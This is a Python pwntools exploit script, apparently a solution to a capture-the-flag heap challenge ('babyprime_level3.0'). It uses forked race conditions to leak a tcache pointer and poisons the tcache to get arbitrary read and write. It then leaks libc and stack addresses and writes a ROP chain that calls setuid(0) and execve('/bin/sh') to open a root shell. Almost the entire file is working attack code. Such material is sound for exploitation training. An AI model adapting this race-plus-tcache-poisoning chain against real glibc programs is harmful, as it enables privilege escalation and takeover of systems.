import time 
from pwn import *
import os


offset1 = 0x8a0 # from heap base to libc
offset2 = 0x60 # from libc to main heap 
offset3 = 0x250 # from main heap to secret's region
offset4 = 0xd70 # secret's address to secret
idx = 2

	
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	return 0

def controlled_allocations(r1, r2, addr, heap_base_addr):
	global idx
	r1.clean()
	r2.clean()
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	r1.sendline(f"malloc {idx}".encode()) # chunk A
	r1.sendline(f"malloc {idx + 1}".encode()) # chunk B
	r1.sendline(f"free {idx + 1}".encode()) # free B
	
	while True:
		#print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free {idx}".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc {idx}".encode()) # this malloc gets A
		r1.sendline(f"printf {idx}".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #
	#	print(addr_packed.split(b'\x00')[0])
		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break
	r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
	r1.clean()
	idx += 2

def arbitrary_read(r1, r2, addr, heap_base_addr):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr)
	r1.sendline(f"printf {idx - 1}".encode())
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 

	return leak

def arbitrary_write(r1, r2, addr, heap_base_addr, content):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr)
	r1.sendline(f"scanf {idx - 1}".encode())
	r1.sendline(content)
	
	
def exploit(r1, r2, p):
	s = '''
	b * challenge+1354
	'''
	global offset1
	global offset2
	global offset3
	global offset4
	
	leak = leak_tcache(r1, r2)
	if leak:
		print("tcache next pointer: ", hex(leak))
		
		# pivoting around memory, so we need to leak many times
		location1 = (leak << 12) + offset1
		#print(f"\nGDB: gdb -p {p.pid}")
		#pause()
		libc_leak = arbitrary_read(r1, r2, location1, leak)
		print("libc leak leak: ", hex(libc_leak))


		location2 = libc_leak + offset2
		print("location2: ", hex(location2))
		#print(f"\nGDB: gdb -p {p.pid}")
		#pause()	
		leak3 = arbitrary_read(r1, r2, location2, leak + 1)
		print("Third leak: ", hex(leak3))

		
		location3 = leak3 - 0x100
		print("location3: ", hex(location3))
		
		stack_leak = arbitrary_read(r1, r2, location3, leak + 1)
		print("stack_leak: ", hex(stack_leak))
		print(f"\nGDB: gdb -p {p.pid}")
		#pause()
		
		
		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		
		# gadgets
		binsh_addr = libc_base + 0x1d8698
		setuid = libc_base + 0xec0d0
		system = libc_base + 0x50d70
		pop_rdi = libc_base + 0x000000000002a3e5
		pop_rsi = libc_base + 0x000000000002be51
		pop_rdx = libc_base + 0x00000000000796a2
		execve = libc_base + 0xeb080
		
		payload = p64(0)
		payload += p64(pop_rdi)
		payload += p64(0)
		payload += p64(setuid)
		payload += p64(pop_rdi)
		payload += p64(binsh_addr)
		payload += p64(pop_rsi)
		payload += p64(rbp_addr + 0x98) # 0x98
		payload += p64(pop_rdx)
		payload += p64(0)
		payload += p64(execve)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(0)
		payload += p64(binsh_addr)
		payload += p64(0)
		
		
		arbitrary_write(r1, r2, rbp_addr, leak + 2, payload)
		#gdb.attach(p, s)
		
		try:
			r2.clean()
			p.clean()
			r2.sendline("quit")
			#r2.sendline("ls")
			#r2.interactive()
			
			p.interactive()
			#response = r1.recvall(timeout=2)
			#response2 = r2.recvall(timeout=2)
			#print(response)
			#print(response2)
		except Exception as e:
			print(f"Final command execution failed: {e}")	
		
		return True
	else:
		#pause()
		print("Failed to leak")
		return False
	
def main(): 
	attempt = 0 
	while True:
		print(f"\nAttempt {attempt + 1}")
		
		global idx 
		idx = 2
		
		try: # code that might fail 
			binary = './babyprime_level3.0_patched'
			p = process(binary)
			r1 = remote("localhost", 1337, timeout = 1)
			r2 = remote("localhost", 1337, timeout = 1)

			if exploit(r1, r2, p):
				break 
		except Exception as e: # what does the program do when `try` fails
			print(f"Error in attempt {attempt + 1}: {e}")
		finally: # code that always run no matter what
			try:
				r1.close()
				r2.close()
				p.kill()
			except:
				pass
		attempt += 1
	

if __name__ == "__main__":
	main()
